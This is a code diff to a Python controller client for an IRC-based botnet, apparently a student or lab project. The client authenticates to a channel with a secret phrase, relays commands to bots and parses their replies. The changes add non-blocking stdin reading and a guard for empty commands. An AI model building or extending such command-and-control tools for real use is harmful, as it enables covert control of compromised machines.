@@ -1,5 +1,6 @@
 import argparse
 import sys
+import select
 import socket
 import time
 import random
@@ -21,11 +22,21 @@ class Controller_Client:
         if connected:
             self.send_to_channel(self.secret_phrase)
         while connected:
-            text = self.get_text()
-            self.log(text)
-            # prompt user to enter a command and execute it
-            command = self.__prompt_command()
-            self.__send_command(command)
+            # executes if there is input to be read in
+            #TODO could make this an IF but might not work for multiple lines/large input?
+            # tcflush(sys.stdin, TCIFLUSH) # flush input buffer while command was being tested
+            while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                command = sys.stdin.readline()
+                if command:
+                    self.__send_command(command)
+                    print("waiting for user input")
+                else: # an empty line means stdin has been closed
+                    raise Exception("stdin has closed unexpectedly")
+            # executes if there is no input to be read in
+            else:
+                text = self.get_text()
+                if text != "":
+                    self.log(text)
 
         self.irc_socket.close()
     
@@ -55,6 +66,8 @@ class Controller_Client:
     # receives and handles the response from the bots
     def __handle_response(self, command, response):
         command = command.split()
+        if len(command) <= 0:
+            return False
         # parse the response into a dictionary
         response_dict = {}
         for line in response.strip().split('\n'):
@@ -65,7 +78,6 @@ class Controller_Client:
                 # get the message sent by the sender
                 message = line.split(' :')[1].strip()
                 response_dict[sender] = message
-
         if command[0] == "status":
             bot_list = []
             for bot in response_dict:
